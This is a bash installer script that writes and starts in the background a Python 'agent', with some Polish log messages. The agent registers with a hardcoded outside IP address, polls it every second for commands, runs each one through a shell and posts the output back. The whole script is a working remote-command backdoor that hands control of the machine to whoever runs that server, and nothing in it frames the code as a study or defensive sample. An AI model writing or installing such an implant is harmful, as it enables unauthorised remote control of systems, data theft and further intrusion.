#!/bin/bash
set -e

AGENT_ID="$1"
if [ -z "$AGENT_ID" ]; then
  echo "Usage: bash install_agent.sh <agent_id>"
  exit 1
fi

AGENT_DIR="$HOME/agent_$AGENT_ID"
mkdir -p "$AGENT_DIR"
pip install requests
cat > "$AGENT_DIR/agent.py" << 'EOF'
import time, subprocess, requests, logging, os, sys

if len(sys.argv) != 2:
    print("Usage: python3 agent.py <agent_id>")
    sys.exit(1)

AGENT_ID = sys.argv[1]
SERVER = 'http://185.14.92.188:8000'
logging.basicConfig(level=logging.INFO, format='[AGENT:%(agent)s] %(message)s')

try:
    requests.post(f'{SERVER}/api/register/{AGENT_ID}')
    logging.info("Registered on server", extra={'agent': AGENT_ID})
except Exception as e:
    logging.error(f"Registration error: {e}", extra={'agent': AGENT_ID})

cwd = os.getcwd()

def get_command():
    try:
        r = requests.get(f'{SERVER}/api/command/{AGENT_ID}')
        return r.json().get('command','')
    except Exception as e:
        logging.error(f"GET cmd error: {e}", extra={'agent': AGENT_ID})
        return ''

def post_output(output):
    try:
        requests.post(f'{SERVER}/api/output/{AGENT_ID}', json={'output': output})
    except Exception as e:
        logging.error(f"POST out error: {e}", extra={'agent': AGENT_ID})

def main():
    global cwd
    last_cmd = None
    while True:
        cmd = get_command()
        if cmd and cmd != last_cmd:
            logging.info(f"Received: {cmd!r}", extra={'agent': AGENT_ID})
            if cmd == '__STOP__':
                logging.info("Stopping.", extra={'agent': AGENT_ID})
                post_output("[Agent stopped]")
                break

            parts = cmd.strip().split()
            if parts[0] == 'cd':
                target = parts[1] if len(parts)>1 else os.path.expanduser('~')
                try:
                    new_dir = target if os.path.isabs(target) else os.path.join(cwd, target)
                    os.chdir(new_dir)
                    cwd = os.getcwd()
                    out = f"Changed directory to {cwd}"
                except Exception as e:
                    out = f"cd error: {e}"
            else:
                try:
                    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=cwd)
                    out = proc.stdout + proc.stderr
                except Exception as e:
                    out = f"Execution error: {e}"

            logging.info("Posting output.", extra={'agent': AGENT_ID})
            post_output(out)
            last_cmd = cmd
        time.sleep(1)

if __name__ == '__main__':
    main()
EOF

AGENT_LOG="$AGENT_DIR/agent.log"
AGENT_PIDFILE="$AGENT_DIR/agent.pid"

if [ -f "$AGENT_PIDFILE" ] && kill -0 $(cat "$AGENT_PIDFILE") 2>/dev/null; then
  echo "[install_agent] Agent działa, zatrzymuję go..."
  kill $(cat "$AGENT_PIDFILE")
  sleep 2
fi

nohup python3 "$AGENT_DIR/agent.py" "$AGENT_ID" > "$AGENT_LOG" 2>&1 &

echo $! > "$AGENT_PIDFILE"

echo "[install_agent] Agent uruchomiony z PID $(cat "$AGENT_PIDFILE"). Log: $AGENT_LOG"
